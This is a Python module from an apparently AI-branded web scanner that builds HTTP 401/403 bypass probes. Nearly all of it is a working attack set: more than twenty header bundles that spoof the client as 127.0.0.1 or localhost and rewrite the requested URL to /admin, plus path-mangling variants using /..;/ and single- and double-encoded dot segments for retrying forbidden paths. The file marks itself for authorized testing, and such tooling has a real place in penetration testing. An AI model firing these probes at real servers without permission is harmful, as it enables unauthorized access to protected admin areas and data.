# Developed by Channa Sandeepa | OmniScan-AI v2.0 | Copyright 2026
"""HTTP 401/403 bypass probes: header sets and path normalization tricks.

Used by :class:`SmartInfiltrationEngine` when ``--bypass-403`` is enabled.
Authorized testing only.
"""

from __future__ import annotations

import re
from typing import Final

# Baseline IP/origin spoof headers applied on every bypass attempt (merged last in infiltrator).
def path_rewrite_bypass_headers(path: str) -> dict[str, str]:
    """Aggressive rewrite headers scoped to the path under test (127.0.0.1 trust-theatre)."""
    p = (path or "").strip() or "/"
    if not p.startswith("/"):
        p = "/" + p
    return {
        "X-Forwarded-For": "127.0.0.1",
        "X-Custom-IP-Authorization": "127.0.0.1",
        "X-Original-URL": p,
        "X-Rewrite-URL": p,
    }


def _mega_bundle(path: str) -> dict[str, str]:
    base = path_rewrite_bypass_headers(path)
    return {
        **base,
        "X-Forwarded-Host": "localhost",
        "X-Real-IP": "127.0.0.1",
        "X-Forwarded-Proto": "https",
        "Forwarded": "for=127.0.0.1;proto=https",
    }


# 20+ distinct header bundles commonly tested in gated assessments.
BYPASS_HEADER_SETS: Final[tuple[dict[str, str], ...]] = (
    {"X-Forwarded-For": "127.0.0.1", "X-Custom-IP-Authorization": "127.0.0.1"},
    {
        "X-Forwarded-For": "127.0.0.1",
        "X-Custom-IP-Authorization": "127.0.0.1",
        "X-Original-URL": "/admin",
        "X-Rewrite-URL": "/admin",
    },
    {"X-Forwarded-For": "127.0.0.1", "X-Forwarded-Host": "localhost"},
    {"X-Forwarded-For": "::1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1", "X-Forwarded-For": "127.0.0.1"},
    {"Client-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Cluster-Client-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"X-Original-URL": "/"},
    {"X-Rewrite-URL": "/"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"Forwarded": "for=127.0.0.1;proto=http"},
    {"X-Forwarded-Proto": "https", "X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-Scheme": "https"},
    {"X-HTTP-Method-Override": "GET"},
    {"X-Forwarded-Prefix": "/"},
    {"X-Original-URL": "/..;/", "X-Rewrite-URL": "/..;/"},
)


def mega_header_set_for_path(path: str) -> dict[str, str]:
    """Full aggressive bundle for a specific URL path (used by infiltrator rotation)."""
    return _mega_bundle(path)


def _basic_path_variants(path: str) -> list[str]:
    p = path.strip() or "/"
    if not p.startswith("/"):
        p = "/" + p
    out: list[str] = []
    for cand in (
        p,
        p.rstrip("/") + "/",
        p.rstrip("/") + "/./",
        re.sub(r"/([^/]+)/", lambda m: f"/{m.group(1).upper()}/", p, count=1)
        if "/" in p[1:]
        else p,
    ):
        if cand not in out:
            out.append(cand)
    return out


def forbidden_path_variants(path: str, *, extended: bool) -> list[str]:
    """Return path strings to retry after 401/403 (encoding and traversal quirks)."""
    out = list(_basic_path_variants(path))
    if not extended:
        return out[:4]
    p = path.strip() or "/"
    if not p.startswith("/"):
        p = "/" + p
    extras = [
        "/%2e/" + p.lstrip("/"),
        p.rstrip("/") + "/..;/",
        p.rstrip("/") + "/%2e%2e;/",
        p + "/..;/" if not p.endswith("/") else p + "..;/",
        "/%252e/" + p.lstrip("/"),
    ]
    if "//" not in p and len(p) > 1:
        extras.append(p.replace("/", "/./", 1) if p.startswith("/") else p)
    for e in extras:
        if e and e not in out:
            out.append(e)
    return out[:14]


def default_header_subset_count() -> int:
    """Headers used when extended 403 suite is off (matches prior engine behavior)."""
    return 5
